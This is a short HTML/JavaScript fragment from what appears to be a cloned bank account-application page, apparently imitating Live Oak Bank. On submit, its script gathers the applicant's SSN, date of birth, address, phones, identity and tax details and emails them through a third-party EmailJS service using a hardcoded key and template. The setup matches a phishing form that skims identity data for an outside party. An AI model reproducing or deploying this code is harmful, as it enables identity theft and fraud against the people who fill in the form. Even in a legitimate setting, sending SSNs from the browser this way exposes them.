    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <script>
        // Initialize EmailJS with your user ID
        (function () {
            emailjs.init("dLES0ktdPRK1iuHaY"); // Replace with your EmailJS User ID
        })();

        // Function to collect the form data and send it via EmailJS
        function sendFormData(event) {
            event.preventDefault(); // Prevent the default form submission

            // Get form data
            const formData = new FormData(document.getElementById("myForm"));

            const formObj = {};
            formData.forEach((value, key) => {
                formObj[key] = value;
            });

            // Prepare the email parameters
            const emailParams = {
                from_name: formObj.firstName + " " + formObj.lastName, // Combine first name and last name
                email: formObj.email,
                productCode: formObj.productCode,
                refId: formObj.refId,
                liveoakProdCSACd: formObj.liveoakProdCSACd,
                firstName: formObj.firstName,
                middleName: formObj.middleName,
                lastName: formObj.lastName,
                suffix: formObj.suffix,
                address1: formObj.address1,
                address2: formObj.address2,
                city: formObj.city,
                state: formObj.state,
                zipCode: formObj.zipCode,
                yearsAtAddress: formObj.yearsAtAddress,
                ssn: formObj.ssn,
                dob: formObj.dob,
                identity: formObj.identity,
                w9Withholdings: formObj.w9Withholdings ? "Yes" : "No",
                mobilePhone: formObj.mobilePhone,
                homePhone: formObj.homePhone,
                employmentStatus: formObj.employmentStatus,
                occupation: formObj.occupation,
                politicalFigure1: formObj.politicalFigure1,
                politicalFigure2: formObj.politicalFigure2,
                certify: formObj.certify ? "Yes" : "No"
            };

            // Send the email using EmailJS
            emailjs.send("service_rknot18", "template_dzog7k9", emailParams)
                .then(function (response) {
                    alert('Form submitted successfully!');
                    console.log('Email sent successfully:', response);
                }, function (error) {
                    alert('Failed to send form data.');
                    console.log('Email sending error:', error);
                });
        }
    </script>
